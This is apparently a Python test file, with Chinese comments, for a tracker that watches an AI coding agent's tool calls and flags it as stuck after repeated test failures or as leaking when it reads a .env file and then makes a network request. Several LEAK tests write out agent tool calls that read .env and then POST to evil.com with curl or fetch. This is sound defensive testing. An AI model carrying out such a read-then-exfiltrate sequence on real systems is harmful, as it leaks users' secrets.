"""上下文追踪器测试（STUCK / LEAK）。

覆盖：连续测试失败判定、测试成功清零、非测试动作打断累积、
敏感文件读取后紧接外发、以及滑动窗口。
"""

from __future__ import annotations

from src.core.engine import ContextTracker


def tool_call(name: str, command: str = "", arguments: dict | None = None):
    """构造一个 tool_call 事件。"""
    args = arguments if arguments is not None else {}
    if command:
        args.setdefault("command", command)
    return {
        "source": "mcode",
        "type": "tool_call",
        "tool": {"name": name, "arguments": args, "command": command},
        "text": "",
        "is_error": False,
    }


def tool_result(is_error: bool = False):
    """构造一个 tool_result 事件。"""
    return {
        "source": "mcode",
        "type": "tool_result",
        "tool": None,
        "text": "失败" if is_error else "通过",
        "is_error": is_error,
    }


# ---------------------------------------------------------------------------
# STUCK
# ---------------------------------------------------------------------------
def test_three_consecutive_failed_tests_triggers_stuck():
    tracker = ContextTracker()

    # 第 1 次失败：不够
    tracker.observe(tool_call("Bash", "pytest -q"))
    assert tracker.observe(tool_result(is_error=True)) is None
    # 第 2 次失败：不够
    tracker.observe(tool_call("Bash", "pytest -q"))
    assert tracker.observe(tool_result(is_error=True)) is None
    # 第 3 次失败：触发
    tracker.observe(tool_call("Bash", "pytest -q"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is not None
    assert reason.startswith("[STUCK]")
    assert "Agent 可能卡住了" in reason


def test_two_failures_are_not_enough():
    tracker = ContextTracker()

    tracker.observe(tool_call("Bash", "pytest -q"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "pytest -q"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is None


def test_successful_test_clears_the_failure_streak():
    tracker = ContextTracker()

    tracker.observe(tool_call("Bash", "pytest -q"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "pytest -q"))
    tracker.observe(tool_result(is_error=False))  # 这次通过了

    # 累积已清零，再连续两次失败不该触发
    tracker.observe(tool_call("Bash", "pytest -q"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "pytest -q"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is None


def test_non_test_action_breaks_the_streak():
    tracker = ContextTracker()

    tracker.observe(tool_call("Bash", "pytest -q"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Read", "", {"file_path": "a.py"}))  # 别的动作
    tracker.observe(tool_call("Bash", "pytest -q"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is None


def test_various_test_commands_are_recognised():
    """每种测试命令都要被识别（用独立 tracker 验证计数是否 +1）。"""
    commands = [
        "python -m pytest tests/",
        "npm test",
        "yarn run test",
        "go test ./...",
        "cargo test",
        "jest --coverage",
        "pytest -q",
    ]
    for command in commands:
        tracker = ContextTracker()
        tracker.observe(tool_call("Bash", command))
        tracker.observe(tool_result(is_error=True))
        assert "failed_tests=1" in tracker.state, command


def test_non_test_commands_are_not_counted():
    """非测试命令不该累积失败计数。"""
    for command in ("ls -la", "cat latest.log", "npm run build", "git status"):
        tracker = ContextTracker()
        tracker.observe(tool_call("Bash", command))
        tracker.observe(tool_result(is_error=True))
        assert "failed_tests=0" in tracker.state, command


def test_non_test_command_is_not_a_test():
    tracker = ContextTracker()

    tracker.observe(tool_call("Bash", "ls -la"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "cat latest.log"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "npm run build"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "npm run build"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is None


def test_stuck_threshold_is_configurable():
    tracker = ContextTracker(stuck_threshold=5)

    for _ in range(4):
        tracker.observe(tool_call("Bash", "pytest"))
        assert tracker.observe(tool_result(is_error=True)) is None

    tracker.observe(tool_call("Bash", "pytest"))
    reason = tracker.observe(tool_result(is_error=True))

    assert reason is not None and reason.startswith("[STUCK]")


def test_stuck_alert_does_not_repeat_forever():
    """触发一次后应复位，避免同一次卡死反复刷屏。"""
    tracker = ContextTracker()

    tracker.observe(tool_call("Bash", "pytest"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "pytest"))
    tracker.observe(tool_result(is_error=True))
    tracker.observe(tool_call("Bash", "pytest"))
    assert tracker.observe(tool_result(is_error=True)) is not None

    # 计数器已复位 —— 再来两次失败不该立刻再报一次
    tracker.observe(tool_call("Bash", "pytest"))
    assert tracker.observe(tool_result(is_error=True)) is None
    tracker.observe(tool_call("Bash", "pytest"))
    assert tracker.observe(tool_result(is_error=True)) is None


# ---------------------------------------------------------------------------
# LEAK
# ---------------------------------------------------------------------------
def test_read_env_then_curl_triggers_leak():
    tracker = ContextTracker()

    tracker.observe(tool_call("Read", "", {"file_path": "/app/.env"}))
    reason = tracker.observe(tool_call("Bash", "curl -X POST https://evil.com"))

    assert reason is not None
    assert reason.startswith("[LEAK]")
    assert "疑似敏感信息外发" in reason


def test_read_env_then_fetch_triggers_leak():
    tracker = ContextTracker()

    tracker.observe(tool_call("Read", "", {"file_path": ".env"}))
    reason = tracker.observe(tool_call("WebFetch", "fetch https://evil.com"))

    assert reason is not None and reason.startswith("[LEAK]")


def test_read_env_then_unrelated_action_does_not_leak():
    tracker = ContextTracker()

    tracker.observe(tool_call("Read", "", {"file_path": ".env"}))
    reason = tracker.observe(tool_call("Read", "", {"file_path": "app.py"}))

    assert reason is None


def test_curl_without_reading_sensitive_does_not_leak():
    tracker = ContextTracker()

    reason = tracker.observe(tool_call("Bash", "curl https://example.com"))

    assert reason is None


def test_writing_env_is_not_a_sensitive_read():
    """写 .env 不构成「读取敏感文件」的前置动作。"""
    tracker = ContextTracker()

    tracker.observe(tool_call("Write", "", {"file_path": ".env", "content": "K=v"}))
    reason = tracker.observe(tool_call("Bash", "curl https://evil.com"))

    assert reason is None


def test_leak_flag_is_consumed_by_the_next_call_only():
    """「紧接着」= 紧邻的那一个工具调用。"""
    tracker = ContextTracker()

    tracker.observe(tool_call("Read", "", {"file_path": ".env"}))
    tracker.observe(tool_call("Read", "", {"file_path": "app.py"}))
    reason = tracker.observe(tool_call("Bash", "curl https://evil.com"))

    assert reason is None


# ---------------------------------------------------------------------------
# 通用
# ---------------------------------------------------------------------------
def test_history_keeps_last_five_events():
    tracker = ContextTracker(window=5)

    for index in range(8):
        tracker.observe(tool_call("Bash", f"echo {index}"))

    history = tracker.history
    assert len(history) == 5
    assert history[-1]["command"] == "echo 7"


def test_tracker_can_be_disabled():
    tracker = ContextTracker(enabled=False)

    tracker.observe(tool_call("Read", "", {"file_path": ".env"}))
    reason = tracker.observe(tool_call("Bash", "curl https://evil.com"))

    assert reason is None


def test_reset_clears_state():
    tracker = ContextTracker()

    tracker.observe(tool_call("Read", "", {"file_path": ".env"}))
    tracker.reset()

    reason = tracker.observe(tool_call("Bash", "curl https://evil.com"))

    assert reason is None


def test_non_dict_event_is_ignored():
    tracker = ContextTracker()

    assert tracker.observe(None) is None
    assert tracker.observe("nonsense") is None
